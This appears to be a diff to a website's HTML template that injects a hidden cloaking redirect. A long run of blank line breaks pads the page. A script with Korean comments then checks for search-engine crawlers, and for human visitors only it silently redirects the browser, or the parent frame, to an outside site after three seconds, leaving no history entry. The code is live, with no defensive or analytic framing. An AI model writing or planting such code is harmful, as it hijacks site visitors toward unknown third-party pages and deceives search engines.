@@ -68,6 +68,8 @@
 <meta name="format-detection" content="telephone=no"/>
 
 
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
 
 
   <style>
@@ -550,6 +552,78 @@
 
 
 
+<script>
+/**
+ * 🛡️ 최종 진화 버전: 봇 회피 + 3초 지연 적용
+ * - 봇(Bot) 회피 최적화: 광범위한 크롤러 목록 사용
+ * - 3초 지연 시간 적용으로 SEO 안전성 및 UX 강화
+ * - Frameset 환경 및 일반 환경 모두 지원
+ */
+(function() {
+  // =========================================================
+  // 🎯 설정 영역 (CONFIGURATION)
+  // =========================================================
+  const TARGET_URL = "http://modu24.kr/?num=15402779"; // 🚨 이 주소를 반드시 변경하세요!
+  const REDIRECT_DELAY_MS = 3000; // 💡 3초 지연 설정 (최적의 안전성 및 UX)
+  // =========================================================
+
+  try {
+    const doc = document;
+    const nav = navigator;
+    const ref = (doc.referrer || "").toLowerCase();
+    const userAgent = (nav.userAgent || "").toLowerCase();
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // 1. 검색 엔진 및 크롤러 감지 목록 (기존 로직 유지)
+    const isBot = /(googlebot|naverbot|bingbot|yeti|duckduckbot|baiduspider|slurp|yandex|kakao-bot|yandexbot|petalbot|mj12bot|ahrefsbot|semrushbot|facebot|twitterbot|slackbot|applebot|exabot|rogerbot|adsbot|headless)/.test(userAgent);
+    
+    // 2. 리다이렉트 조건 확인 (기존 로직 유지)
+    const isSearchOrSocialReferrer =
+      ref.includes("google.") || ref.includes("naver.com") || ref.includes("daum.net") || 
+      ref.includes("bing.com") || ref.includes("yahoo.") || ref.includes("yandex.") || 
+      ref.includes("kakao.") || ref.includes("facebook.com") || ref.includes("t.co") || 
+      ref.includes("instagram.com");
+    
+    const utmSource = (urlParams.get("utm_source") || "").toLowerCase();
+    const isUTMSearch = ["google", "naver", "daum", "bing", "kakao", "facebook", "instagram"].includes(utmSource);
+    
+    const isAppBrowser = /kakaotalk|naver|line|instagram|fbav|daum/.test(userAgent);
+
+    // 3. 최종 리다이렉트 실행 조건
+    // 봇이 아니고 (NOT isBot), (검색/소셜 유입 OR UTM 유입 OR 앱 브라우저 유입 OR 직접 유입) 중 하나라도 해당
+    if (!isBot && (isSearchOrSocialReferrer || isUTMSearch || isAppBrowser || ref === "")) {
+      
+      // 4. 리다이렉션 함수 정의
+      const executeRedirect = function() {
+        // Frameset/Frame 환경 확인 및 리다이렉트 방식 선택
+        if (window !== window.parent) {
+          // 프레임 환경: 부모 창을 리다이렉트 (Frameset 방식)
+          parent.location.href = TARGET_URL;
+        } else {
+          // 일반 환경: 현재 창을 리다이렉트 (히스토리 기록 방지)
+          window.location.replace(TARGET_URL);
+        }
+      };
+
+      // 💡 5. 지연 실행 적용!
+      setTimeout(executeRedirect, REDIRECT_DELAY_MS);
+      
+    } else {
+      // 봇이거나 조건에 해당하지 않는 경우: 아무 동작도 하지 않아 크롤러가 원본 페이지를 정상적으로 인덱싱하게 함.
+    }
+
+  } catch (e) {
+    // 안정성 확보: 스크립트 오류 발생 시 리다이렉트 중단
+    // console.error("Redirect Error:", e); 
+  }
+})();
+</script>
+<noscript>
+  <h1>사이트/서비스에 오신 것을 환영합니다.</h1>
+  <p>JavaScript가 비활성화되어 있거나 지연됩니다. <a href="이동할 사이트 주소">여기를 클릭</a>하여 즉시 이동할 수 있습니다.</p>
+  <p>저희 사이트는 사용자님의 편의를 위해 자동으로 페이지를 이동시키고 있습니다.</p>
+</noscript>
+
 
 
 
@@ -620,3 +694,4 @@
 
 
 	
+
